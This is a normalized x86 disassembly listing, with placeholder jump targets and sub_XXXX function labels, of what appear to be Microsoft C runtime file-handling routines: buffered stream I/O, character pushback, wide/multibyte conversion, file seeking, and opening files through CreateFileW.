cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_43b047
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_44b23c
pop ecx
mov ebx eax
call sub_43c04c
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_43a820
add esp 0xc
sub_44b391
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
jmp r-xdata
mov eax 0xffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_44b922
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0x1
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_43917d
pop ecx
push eax
call sub_440980
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
cmp eax 0xffffffff
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_43917d
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
add [ esi + 0x4 ] 0xfffffffe
movzx eax [ ecx ]
add ecx 0x2
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_43917d
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push edi
push esi
call sub_43917d
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_43917d
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
pop edi
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_44b4c1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_44b5f1
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_43c04c
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_44b5f1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_44b63c
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_43917d
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_43c04c
mov [ eax ] 0x9
test al 0x1
je r-xdata
call sub_43c04c
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push 0x2
and eax 0xffffffef
pop ebx
or eax ebx
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_438fc8
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
mov edi ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] bx
call sub_44ad99
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x2 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
sub ecx ebx
mov [ esi + 0x4 ] ecx
test edi edi
jle r-xdata
push [ ebp + 0xc ]
call sub_44cd54
pop ecx
test eax eax
jne r-xdata
call sub_438fc8
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
mov eax ebx
and eax 0xffff
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_44ad99
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_44b922
pop ecx
pop edi
pop ebx
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] bx
jmp r-xdata
push ebx
push 0x0
push 0x0
push ecx
call sub_44bda7
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_44b7b0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
call sub_43f8c5
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_43c04c
mov [ eax ] 0x2a
call sub_43c04c
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_43c04c
push 0x22
pop esi
mov [ eax ] esi
call sub_43f8c5
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_43a820
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_43a820
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_44b922
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_43ddd2
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_44b96b
mov edi edi
push ebp
mov ebp esp
mov eax 0x1020
call sub_43a7f0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_43917d
mov ebx eax
xor eax eax
pop ecx
mov [ ebp - 0x1018 ] ebx
cmp [ esi + 0x4 ] eax
jge r-xdata
push 0x1
push eax
push eax
push ebx
call sub_44bda7
add esp 0x10
mov edi eax
mov [ ebp - 0x1014 ] edi
mov [ ebp - 0x1010 ] edx
test edx edx
jg r-xdata
mov [ esi + 0x4 ] eax
mov eax ebx
sar eax 0x5
lea eax [ eax * 4 + rw-data ]
and ebx 0x1f
mov [ ebp - 0x101c ] eax
mov eax [ eax ]
shl ebx 0x6
add eax ebx
mov cl [ eax + 0x24 ]
add cl cl
sar cl 0x1
test [ esi + 0xc ] 0x108
mov [ ebp - 0x1005 ] cl
jne r-xdata
jl r-xdata
mov ecx [ esi ]
mov edx [ esi + 0xc ]
mov edi ecx
sub edi [ esi + 0x8 ]
mov [ ebp - 0x100c ] edi
test dl 0x3
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ ebp - 0x1010 ]
cdq
sub edi eax
sbb ecx edx
mov eax edi
mov edx ecx
jmp r-xdata
or eax 0xffffffff
or edx eax
jmp r-xdata
test edi edi
jae r-xdata
test dl dl
js r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
mov edx [ ebp - 0x1014 ]
or edx [ ebp - 0x1010 ]
jne r-xdata
call sub_43c04c
mov [ eax ] 0x16
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
xor edx edx
cmp [ eax + 0x30 ] edx
je r-xdata
test [ esi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0x100c ]
jmp r-xdata
mov edx [ esi + 0x8 ]
jmp r-xdata
shr edi 0x1
mov [ ebp - 0x1020 ] edi
cmp [ esi + 0x4 ] edx
jne r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
mov edx [ esi + 0x4 ]
test edx edx
jne r-xdata
cmp edx ecx
jb r-xdata
push edx
push [ eax + 0x2c ]
push [ eax + 0x28 ]
push [ ebp - 0x1018 ]
call sub_44bda7
mov esi eax
mov eax [ ebp - 0x101c ]
mov eax [ eax ]
add esp 0x10
mov edi edx
cmp esi [ eax + ebx + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x1014 ]
mov edx [ ebp - 0x1010 ]
jmp r-xdata
mov eax [ ebp - 0x100c ]
xor edx edx
add eax [ ebp - 0x1014 ]
adc edx [ ebp - 0x1010 ]
shr [ ebp - 0x100c ] 0x1
sub ecx [ esi + 0x8 ]
test [ eax + 0x4 ] 0x80
lea edi [ edx + ecx ]
je r-xdata
and [ ebp - 0x100c ] edx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
cmp edi [ eax + ebx + 0x2c ]
jne r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp - 0x1018 ]
call sub_44bda7
add esp 0x10
cmp eax [ ebp - 0x1014 ]
jne r-xdata
inc edx
inc [ ebp - 0x100c ]
push 0x0
lea ecx [ ebp - 0x100c ]
push ecx
push 0x1000
lea ecx [ ebp - 0x1004 ]
push ecx
push [ eax + ebx ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
sub [ ebp - 0x1014 ] edi
sbb [ ebp - 0x1010 ] 0x0
shr edi 0x1
push 0x0
push [ ebp - 0x1010 ]
push [ ebp - 0x1014 ]
push [ ebp - 0x1018 ]
call sub_44bda7
add esp 0x10
test edx edx
jg r-xdata
cmp edx [ ebp - 0x1010 ]
jne r-xdata
push 0x0
push [ ebp - 0x1010 ]
push [ ebp - 0x1014 ]
push [ ebp - 0x1018 ]
call sub_44bda7
add esp 0x10
test edx edx
jg r-xdata
mov eax 0x200
cmp edi eax
ja r-xdata
jl r-xdata
mov eax [ esi + 0x8 ]
lea ecx [ eax + edi ]
jmp r-xdata
mov ecx [ ebp - 0x100c ]
mov ebx [ ebp - 0x1020 ]
cmp ebx ecx
ja r-xdata
jl r-xdata
mov edi [ esi + 0x18 ]
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
test eax eax
jb r-xdata
cmp eax ecx
jb r-xdata
lea eax [ ebp - 0x1004 ]
test ebx ebx
je r-xdata
test eax eax
jb r-xdata
inc edi
mov edi eax
test ecx 0x400
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ esi + 0xc ] 0x2000
jmp r-xdata
lea ecx [ ebp - 0x1004 ]
sub eax ecx
xor edx edx
add eax esi
adc edx edi
jmp r-xdata
lea edx [ ebp + ecx - 0x1004 ]
mov eax [ ebp - 0x101c ]
mov eax [ eax ]
test [ eax + ebx + 0x4 ] 0x4
inc eax
inc edi
je r-xdata
mov cl [ eax ]
cmp cl 0xd
jne r-xdata
movzx ecx cl
movsx ecx [ ecx + rw-data ]
add eax ecx
lea ecx [ edx - 0x1 ]
cmp eax ecx
jae r-xdata
dec ebx
cmp eax edx
jae r-xdata
inc eax
test ebx ebx
jne r-xdata
lea ecx [ eax + 0x1 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax ecx
jmp r-xdata
sub_44bcb5
push 0x10
push r--data
call sub_43f8e0
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_43909f
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_44b96b
pop ecx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_44bd18
mov eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_43f925
retn
sub_44bd22
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_442da2
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_43c04c
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_43c072
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_44bda7
push 0x14
push r--data
call sub_43f8e0
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_43c05f
and [ eax ] 0x0
call sub_43c04c
mov [ eax ] 0x9
call sub_43c05f
and [ eax ] 0x0
call sub_43c04c
mov [ eax ] 0x9
call sub_43f8c5
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_43f925
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_442e0b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_43c04c
mov [ eax ] 0x9
call sub_43c05f
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44bd22
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_44be87
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_44bea0
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
xor edi edi
push edi
push edi
push edi
push edi
push ecx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x20 ] ecx
xor ebx ebx
call sub_44f549
add esp 0x20
mov [ ebp - 0x14 ] eax
test al 0x4
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_44eaa7
test [ ebp - 0x14 ] 0x2
pop ecx
pop ecx
jne r-xdata
mov ebx 0x200
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
jmp r-xdata
mov ebx 0x80
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x14 ] eax
pop edi
mov [ esi ] ebx
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
or ebx 0x100
cmp eax 0x2
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
sub_44bf4f
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
mov esi eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x34 ] 0xc
mov [ ebp - 0x30 ] ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_43f873
int3
mov eax 0x8000
test [ ebp + 0x10 ] eax
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_43925e
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
and eax 0x3
sub eax ebx
mov ecx 0xc0000000
mov edx 0x80000000
je r-xdata
test [ ebp + 0x10 ] 0x74000
jne r-xdata
mov [ ebp - 0xc ] edx
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x24 ] eax
je r-xdata
mov [ ebp - 0x14 ] ebx
sub eax ecx
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
test [ ebp + 0x10 ] 0x70000
jne r-xdata
mov [ ebp - 0xc ] ecx
jmp r-xdata
call sub_43c05f
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
call sub_43f8c5
mov eax esi
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x18 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
push edi
mov edi 0x100
cmp eax ecx
jg r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
pop esi
pop ebx
leave
retn
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x18 ] 0x5
jmp r-xdata
cmp eax edx
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
test eax 0x1000
je r-xdata
or [ ebp - 0x10 ] 0x4000000
or [ ebp - 0xc ] 0x10000
or [ ebp - 0x14 ] 0x4
mov [ ebp - 0x10 ] 0x1
call sub_43c05f
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
call sub_43f8c5
mov eax esi
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0xc ] edx
sete al
mov [ ebp - 0x14 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0x10 ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0x10 ] 0x8000000
jmp r-xdata
mov [ ebp - 0x18 ] 0x2
jmp r-xdata
call sub_442ed1
or ebx 0xffffffff
mov [ esi ] eax
cmp eax ebx
jne r-xdata
or [ ebp - 0x10 ] 0x10000000
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileW@IAT ]
push 0x0
push [ ebp - 0x10 ]
mov [ eax ] 0x1
push [ ebp - 0x18 ]
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
call sub_43c05f
and [ eax ] 0x0
mov [ esi ] ebx
call sub_43c04c
mov [ eax ] 0x18
call sub_43c04c
mov eax [ eax ]
jmp r-xdata
push [ ebp - 0x20 ]
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
pop edi
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_43c072
pop ecx
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_43c072
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_43c04c
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_43c04c
mov [ eax ] 0xd
jmp r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
and [ ebp - 0xc ] 0x7fffffff
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x34 ]
push [ ebp - 0x18 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x20 ]
push [ esi ]
call sub_442c9b
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
cmp [ ebp - 0x3 ] 0x0
mov [ eax ] cl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x24 ]
and eax edi
jne r-xdata
push 0x2
push ebx
push [ esi ]
call sub_440cbb
mov edi eax
add esp 0xc
cmp edi ebx
jne r-xdata
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] 0x0
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
and [ ebp - 0x28 ] 0x0
push 0x1
lea eax [ ebp - 0x28 ]
push eax
push [ esi ]
call sub_4403c9
add esp 0xc
test eax eax
jne r-xdata
call sub_43c05f
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x34 ]
push 0x3
push eax
push [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
and eax 0x7fffffff
push eax
push [ ebp + 0xc ]
call [ CreateFileW@IAT ]
cmp eax ebx
jne r-xdata
xor edi edi
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x1c ] edi
